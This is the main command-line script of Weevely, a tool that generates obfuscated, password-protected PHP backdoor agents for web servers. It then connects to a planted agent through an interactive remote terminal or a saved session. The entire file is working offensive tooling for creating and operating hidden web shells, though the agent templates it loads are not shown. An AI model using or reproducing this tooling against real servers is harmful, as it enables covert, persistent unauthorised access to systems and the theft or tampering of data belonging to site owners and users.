#!/usr/bin/env python3
import glob
import os
import pprint
import sys
import typing as t

import click

from core import generate as _generate, messages, modules
from core.config import agent_templates_folder_path, obfuscators_templates_folder_path
from core.loggers import log, dlog
from core.sessions import SessionURL, SessionFile
from core.terminal import Terminal

if sys.stdout.encoding is None:
    print("Please set PYTHONIOENCODING=UTF-8 running 'export PYTHONIOENCODING=UTF-8' before starting Weevely.")
    exit(1)


def list_templates(path):
    return [
        os.path.split(agent)[1].split('.')[0] for agent in
        glob.glob('%s/*.tpl' % path)
    ]


agents_available = list_templates(agent_templates_folder_path)
obfuscators_available = list_templates(obfuscators_templates_folder_path)


class DefaultGroup(click.Group):
    def __init__(self, **attrs: t.Any):
        attrs['invoke_without_command'] = True
        super().__init__(**attrs)

    def parse_args(self, ctx, args):
        if len(args) and args[0] not in ['terminal', 'generate', 'session']:
            args.insert(0, 'terminal')
        return super(DefaultGroup, self).parse_args(ctx, args)


def run_cmd(_session, cmd):
    dlog.debug(
        pprint.pformat(_session)
    )

    modules.load_modules(_session)

    if not cmd:
        Terminal(_session).cmdloop()
    else:
        Terminal(_session).onecmd(cmd)


@click.group(cls=DefaultGroup)
@click.pass_context
def cli(ctx):
    if ctx.invoked_subcommand is None:
        click.echo(terminal.get_help(ctx))


@cli.command()
@click.argument('url')
@click.argument('password')
@click.argument('cmd', nargs=-1, required=False)
def terminal(url, password, cmd):
    """Connect to a Weevely agent at URL using PASSWORD."""
    run_cmd(SessionURL(
        url=url,
        password=password
    ), cmd)


@cli.command()
@click.argument('path')
@click.argument('cmd', nargs=-1, required=False)
def session(path, cmd):
    run_cmd(SessionFile(path), cmd)


@cli.command()
@click.argument('password', required=True)
@click.argument('path')
@click.option('-o', '--obfuscator', default='phar', type=click.Choice(obfuscators_available))
@click.option('-a', '--agent', default='obfpost_php', type=click.Choice(agents_available))
def generate(password, path, obfuscator, agent):
    """Generate a new agent at PATH using PASSWORD."""
    obfuscated = _generate.generate(
        password=password,
        obfuscator=obfuscator,
        agent=agent
    )

    _generate.save_generated(obfuscated, path)

    if path != '-':
        log.info(
            messages.generate.generated_backdoor_with_password_s_in_s_size_i %
            (path, password, len(obfuscated))
            )


cli()
